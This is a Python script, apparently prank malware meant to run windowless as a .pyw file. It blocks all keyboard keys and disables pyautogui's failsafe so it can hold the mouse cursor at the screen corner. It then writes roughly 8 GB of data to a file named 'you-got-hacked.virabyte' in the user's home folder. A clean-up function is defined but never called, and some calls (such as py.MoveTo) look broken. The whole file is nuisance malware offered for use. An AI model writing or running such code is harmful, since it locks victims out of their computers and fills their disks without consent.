# -------------------------------------------------
# python code                                     -
# python version > python 3.6.x                   -
# need to pip install pyautogui and and keyboard  -
# type Python file: .pyw                          -
# -------------------------------------------------

import keyboard as kb
import pyautogui as py
import os, math, sys

def keylock():
    for i in range(100000):
        try:
            kb.block_key(i)
        except:
            pass
def pyauto():
    py.FAILSAFE = False
    x = 1000 * 30
    for i in range(x):
        py.MoveTo(0, 0, duration=0.001)
def dos():
    sys.set_int_max_str_digits(1_000_000_000)
    with open(f'{os.path.expanduser("~")}{os.sep}you-got-hacked.virabyte', 'w') as f:
        for i in range(8):
            f.write('0' * 500_000_000)
            f.write('1' * 500_000_000)

def main():
    keylock()
    pyauto()
    dos()

if __name__ == '__main__':
    main()

# =========================================== clean up ===========================================


def clean():
    os.remove(f'{os.path.expanduser("~")}{os.sep}you-got-hacked.virabyte')
    sys.exit(0)
    os._exit(0)
 
